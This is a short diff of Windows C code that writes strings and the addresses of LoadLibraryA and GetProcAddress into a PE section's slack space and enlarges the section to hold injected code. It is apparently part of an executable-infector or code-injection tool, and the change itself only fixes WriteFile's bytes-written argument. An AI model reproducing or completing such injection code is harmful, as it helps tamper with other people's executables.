@@ -142,13 +142,14 @@ VOID HandleSessionTable(LPVOID file, LPVOID base)
 		{
 			DWORD datavirtualbase = p->VirtualAddress + p->Misc.VirtualSize;
 			DWORD datafileoffect = p->PointerToRawData + p->Misc.VirtualSize;
+			DWORD wLength = 0;
 			SetFilePointer(file, datafileoffect, NULL, FILE_BEGIN);
-			WriteFile(file, funcname, 16, 0, 0);
-			WriteFile(file, DLLname, 16, 0, 0);
-			WriteFile(file, Caption, 16, 0, 0);
-			WriteFile(file, Content, 16, 0, 0);
-			WriteFile(file, &LoadLibraryAAddr, 4, 0, 0);
-			WriteFile(file, &GetProcAddress, 4, 0, 0);
+			WriteFile(file, funcname, 16, &wLength, 0);
+			WriteFile(file, DLLname, 16, &wLength, 0);
+			WriteFile(file, Caption, 16, &wLength, 0);
+			WriteFile(file, Content, 16, &wLength, 0);
+			WriteFile(file, &LoadLibraryAAddr, 4, &wLength, 0);
+			WriteFile(file, &GetProcAddress, 4, &wLength, 0);
 			DWORD codevirtualbase = p->VirtualAddress + p->Misc.VirtualSize + datalength;
 			DWORD cedefileoffset = p->PointerToRawData + p->Misc.VirtualSize + datalength;
 			p->Misc.VirtualSize += (codeslength + datalength);
